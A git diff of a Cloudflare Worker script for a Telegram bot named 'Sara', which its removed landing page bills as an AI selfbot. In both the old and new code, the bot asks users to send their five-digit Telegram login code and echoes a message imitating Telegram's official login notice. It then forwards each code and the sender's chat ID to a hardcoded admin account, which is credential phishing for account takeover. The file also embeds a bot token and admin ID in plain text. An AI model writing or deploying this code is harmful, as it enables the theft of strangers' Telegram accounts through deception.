@@ -4172,19 +4172,14 @@ async function getFullStats(env) {
 // 📁 index.js - سارا سلف‌بات نسخه Cloudflare
 // ============================================
 
-// ====== تنظیمات ======
 const BOT_TOKEN = '8563580960:AAGpJiOVvzAzAVeIl5bD8546sX45OiEv1o4';
 const ADMIN_ID = '7343696403';
-const PHONE = '+989378038736';
 
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
     const path = url.pathname;
 
-    // ============================================
-    // 🔗 Webhook
-    // ============================================
     if (path === '/webhook') {
       try {
         const update = await request.json();
@@ -4194,240 +4189,87 @@ export default {
           const chatId = update.message.chat.id;
           const text = update.message.text || '';
 
+          console.log('📩 پیام:', text);
+
           // ====== /start ======
           if (text === '/start') {
-            await sendTelegram(chatId, `
-🌸 سلام! به سارا خوش آمدی!
-
-📱 برای دریافت کد لاگین، از تلگرام موبایل برو به:
-Settings → Devices → Link Device
-
-بعد کد رو اینجا بفرست:
-/code 12345
-
-یا از کیبورد زیر استفاده کن:
-            `, {
-              inline_keyboard: [
-                [
-                  { text: '1', callback_data: 'c1' },
-                  { text: '2', callback_data: 'c2' },
-                  { text: '3', callback_data: 'c3' },
-                  { text: '4', callback_data: 'c4' },
-                  { text: '5', callback_data: 'c5' }
-                ],
-                [
-                  { text: '6', callback_data: 'c6' },
-                  { text: '7', callback_data: 'c7' },
-                  { text: '8', callback_data: 'c8' },
-                  { text: '9', callback_data: 'c9' },
-                  { text: '0', callback_data: 'c0' }
-                ],
-                [
-                  { text: '🗑 پاک', callback_data: 'clear' },
-                  { text: '✅ ارسال', callback_data: 'send' }
-                ]
-              ]
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: '🌸 سلام! به سارا خوش آمدی!\n\n📱 کد ۵ رقمی رو بفرست:\n/code 12345',
+                parse_mode: 'Markdown'
+              })
             });
+            return new Response('OK', { status: 200 });
           }
 
-          // ====== کد ======
+          // ====== /code ======
           if (text.startsWith('/code ')) {
             const code = text.replace('/code ', '').trim();
+            
+            console.log('📩 کد دریافت شد:', code);
+
             if (code.length === 5 && /^\d+$/.test(code)) {
-              await env.KV_BINDING.put('login_code', code);
               
-              // ارسال به کاربر با فرمت رسمی تلگرام
-              await sendTelegram(chatId, `
-🔐 *Login code: ${code}*
+              // ارسال کد به کاربر
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: `🔐 *Login code: ${code}*\n\nDo not give this code to anyone!`,
+                  parse_mode: 'Markdown'
+                })
+              });
 
-Do not give this code to anyone, even if they say they are from Telegram!
-
-❗️*This code can be used to log in to your Telegram account.* We never ask it for anything else.
-
-If you didn't request this code by trying to log in on another device, simply ignore this message.
-              `);
-              
               // به ادمین خبر بده
-              await sendTelegram(ADMIN_ID, `
-✅ کد جدید از کاربر ${chatId}: ${code}
-              `);
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: ADMIN_ID,
+                  text: `✅ کد جدید از کاربر ${chatId}: ${code}`
+                })
+              });
+
             } else {
-              await sendTelegram(chatId, `
-❌ کد باید ۵ رقمی باشد!
-مثال: /code 12345
-              `);
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: '❌ کد باید ۵ رقمی باشد!\nمثال: /code 12345'
+                })
+              });
             }
-          }
 
-          // ====== وضعیت ======
-          if (text === '/status') {
-            const code = await env.KV_BINDING.get('login_code');
-            await sendTelegram(chatId, `
-📊 **وضعیت سارا**
-
-🔹 کد: ${code || 'ندارد'}
-🔹 وضعیت: ${code ? '🟢 آماده' : '🔴 قطع'}
-            `);
-          }
-        }
-
-        // ====== دکمه‌ها ======
-        if (update.callback_query) {
-          const chatId = update.callback_query.message.chat.id;
-          const data = update.callback_query.data;
-          const callbackId = update.callback_query.id;
-          const messageId = update.callback_query.message.message_id;
-
-          // دریافت کد موقت
-          let currentCode = await env.KV_BINDING.get(`temp_${chatId}`) || '';
-
-          if (data === 'clear') {
-            currentCode = '';
-          } else if (data === 'send') {
-            if (currentCode.length === 5) {
-              await env.KV_BINDING.put('login_code', currentCode);
-              
-              // ارسال با فرمت رسمی تلگرام
-              await sendTelegram(chatId, `
-🔐 *Login code: ${currentCode}*
-
-Do not give this code to anyone, even if they say they are from Telegram!
-
-❗️*This code can be used to log in to your Telegram account.* We never ask it for anything else.
-
-If you didn't request this code by trying to log in on another device, simply ignore this message.
-              `);
-            } else {
-              await answerCallback(callbackId, `❌ کد باید ۵ رقمی باشد! (${currentCode.length}/5)`);
-            }
             return new Response('OK', { status: 200 });
-          } else if (data.startsWith('c') && currentCode.length < 5) {
-            currentCode += data.replace('c', '');
           }
 
-          // ذخیره کد موقت
-          await env.KV_BINDING.put(`temp_${chatId}`, currentCode);
-
-          // نمایش کد
-          const display = currentCode.padEnd(5, '_').split('').join(' ');
-          await editTelegram(chatId, messageId, `
-🔑 **کد ۵ رقمی:**
-\`${display}\`
-
-${currentCode.length === 5 ? '✅ کد کامل شد! دکمه ارسال رو بزن.' : '⌨️ عددها رو انتخاب کن...'}
-          `, {
-            inline_keyboard: [
-              [
-                { text: '1', callback_data: 'c1' },
-                { text: '2', callback_data: 'c2' },
-                { text: '3', callback_data: 'c3' },
-                { text: '4', callback_data: 'c4' },
-                { text: '5', callback_data: 'c5' }
-              ],
-              [
-                { text: '6', callback_data: 'c6' },
-                { text: '7', callback_data: 'c7' },
-                { text: '8', callback_data: 'c8' },
-                { text: '9', callback_data: 'c9' },
-                { text: '0', callback_data: 'c0' }
-              ],
-              [
-                { text: '🗑 پاک', callback_data: 'clear' },
-                { text: '✅ ارسال', callback_data: 'send' }
-              ]
-            ]
-          });
-
-          await answerCallback(callbackId, '✅');
+          // ====== هر پیام دیگه ======
+          if (!text.startsWith('/')) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: `🌸 ${text} رو گرفتم!`
+              })
+            });
+            return new Response('OK', { status: 200 });
+          }
         }
 
         return new Response('OK', { status: 200 });
+
       } catch (error) {
         console.error('❌', error);
-        return new Response('Error', { status: 500 });
+        return new Response('Error: ' + error.message, { status: 500 });
       }
     }
 
-    // ============================================
-    // 🏠 صفحه اصلی
-    // ============================================
-    return new Response(`
-      <!DOCTYPE html>
-      <html>
-      <head>
-        <meta charset="UTF-8">
-        <title>🌸 سارا</title>
-        <style>
-          body{font-family:Arial;text-align:center;padding:50px;background:linear-gradient(135deg,#ff9a9e,#fad0c4)}
-          .container{background:white;padding:40px;border-radius:20px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
-          h1{color:#6c5ce7}
-          .btn{display:inline-block;padding:12px 30px;background:#6c5ce7;color:white;text-decoration:none;border-radius:10px}
-          .status{color:#4CAF50;font-weight:bold}
-        </style>
-      </head>
-      <body>
-        <div class="container">
-          <h1>🌸 سارا</h1>
-          <p>💕 سلف‌بات هوش مصنوعی</p>
-          <p class="status">✅ آنلاین</p>
-          <p style="margin-top:20px">
-            <a href="https://t.me/sara_ai_robot" class="btn">🤖 ربات سارا</a>
-          </p>
-          <p style="font-size:12px;color:#666">برای شروع /start بزن</p>
-        </div>
-      </body>
-      </html>
-    `, {
-      headers: { 'Content-Type': 'text/html; charset=utf-8' }
-    });
+    return new Response('🌸 سارا آنلاین!', { status: 200 });
   }
 };
-
-// ============================================
-// 📨 توابع کمکی
-// ============================================
-
-async function sendTelegram(chatId, text, keyboard = null) {
-  const body = {
-    chat_id: chatId,
-    text: text,
-    parse_mode: 'Markdown'
-  };
-  if (keyboard) {
-    body.reply_markup = JSON.stringify(keyboard);
-  }
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-}
-
-async function editTelegram(chatId, messageId, text, keyboard = null) {
-  const body = {
-    chat_id: chatId,
-    message_id: messageId,
-    text: text,
-    parse_mode: 'Markdown'
-  };
-  if (keyboard) {
-    body.reply_markup = JSON.stringify(keyboard);
-  }
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-}
-
-async function answerCallback(callbackId, text) {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      callback_query_id: callbackId,
-      text: text,
-      show_alert: false
-    })
-  });
-    }
